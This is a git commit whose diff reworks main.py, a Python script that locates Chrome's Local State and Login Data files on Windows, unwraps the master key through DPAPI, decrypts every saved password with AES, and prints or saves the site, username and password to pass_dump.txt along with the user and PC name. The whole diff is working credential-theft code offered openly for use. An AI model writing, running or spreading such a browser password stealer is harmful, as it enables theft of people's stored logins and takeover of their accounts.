fa63c446e138902e30235eeac08b5579d0821954
jypiter112 <146531209+jypiter112@users.noreply.github.com>
2024-11-21 13:13:17 +0200

    Updated to use env variables and added save option
    Save option saves to working dir under file: pass_dump.txt
    Formatted output a bit
    Made code more readable
    Improvements to code writing
    Added error checking

--- main.py
+++ main.py
@@ -1,10 +1,6 @@
-import json, base64, sqlite3, win32crypt
+import json, base64, sqlite3, win32crypt, os
 import Cryptodome.Cipher.AES as AES
 
-path = # PATH HERE
-login_data_path = # RELATIVE PATH HERE
-
-master_key = b''
 def decrypt_password(cipher_text: bytes) -> str:
     global master_key
     init_vec = cipher_text[3:15]
@@ -13,31 +9,77 @@ def decrypt_password(cipher_text: bytes) -> str:
     decrypted_password = cipher.decrypt(encrypted_password)
     decrypted_password = decrypted_password.decode()
     return decrypted_password
-with open(path, "r", encoding="utf-8") as f:
-    t = f.read()
-    j = json.loads(t)
-    key = j["os_crypt"]["encrypted_key"]
-    bdecoded = base64.b64decode(key)
-    dpapi_removed = bdecoded[5:]
-    master_key = win32crypt.CryptUnprotectData(dpapi_removed, None, None, None, 0)[1]
-con = sqlite3.connect(login_data_path)
-cur = con.cursor()
-try:
-    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-except Exception as e:
-    print("Couldnt oben sqlite3 db, error:", e)
-    exit(1)
-rows = cur.fetchall()
-decrypted_rows = []
-for row in rows:
-    cipher_text = row[2]
-    decrypted_pass = decrypt_password(cipher_text)
-    decrypted_rows.append({
-        "url":row[0],
-        "username":row[1],
-        "password":decrypted_pass
-    })
-con.close()
 
-for row in decrypted_rows:
-    print(row)
+def get_masterkey(path: str) -> bytes:
+    m_key = b''
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            t = f.read()
+            j = json.loads(t)
+            key = j["os_crypt"]["encrypted_key"]
+            bdecoded = base64.b64decode(key)[5:]
+            m_key = win32crypt.CryptUnprotectData(bdecoded, None, None, None, 0)[1]
+        return m_key
+    except:
+        print("[Error] Couldnt read Local State file")
+        exit(1)
+
+def print_and_save_creds(decrypted_rows: list):
+    save_path = os.getcwd() + '\\pass_dump.txt'
+    username = os.environ['USERNAME']
+    pcname = os.environ['USERDOMAIN']
+    whole_crds_str = ''
+    i = 0
+    usr_f = f"Username: {username}    PC Name: {pcname}\n"
+    print(usr_f, end="")
+
+    save_file = 0
+    c = str(input("Do you want to save the output? Y/n: "))
+    if(c == "y" or c == "Y"):
+        save_file = open(save_path, "w", encoding="utf-8")
+    for row in decrypted_rows:
+        row_f = f"\n{i} Website: {row['url']}\nUsername: {row['username']}\nPassword: {row['password']}"
+        print(row_f)
+        if(save_file != 0):
+            save_file.write(f"\n{row_f}\0")
+        i += 1
+    if(save_file != 0):
+        save_file.close()
+        print("\n\n--- Saved to .\\pass_dump.txt ---")
+
+# ---- ENTRY MAIN
+if __name__ == "__main__":
+    # Get Environment variables
+    chrome_localstate_path = os.environ['APPDATA'] + '\\..\\Local\\Google\\Chrome\\User Data\\Local State'
+    chrome_datafile_path = os.environ['APPDATA'] + '\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
+    if os.path.exists(chrome_localstate_path) == False:
+        print("[Error] Couldn't find Chrome Local State path!", chrome_localstate_path)
+    if os.path.exists(chrome_datafile_path) == False:
+        print("[Error] Couldn't find Chrome Login Data path!", chrome_datafile_path)
+    # -------------
+
+    master_key = get_masterkey(chrome_localstate_path)
+    con = sqlite3.connect(chrome_datafile_path)
+    cur = con.cursor()
+
+    try:
+        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+    except Exception as e:
+        print("Couldnt oben sqlite3 db, error:", e)
+        exit(1)
+    rows = cur.fetchall()
+
+    # return a list of credentials
+    decrypted_rows = []
+    for row in rows:
+        cipher_text = row[2]
+        decrypted_pass = decrypt_password(cipher_text)
+        # Only append those entries with non empty passwords
+        if len(decrypted_pass) > 0: 
+            decrypted_rows.append({
+                "url":row[0],
+                "username":row[1],
+                "password":decrypted_pass
+            })
+    con.close() # Close sqlite3 connection
+    print_and_save_creds(decrypted_rows)
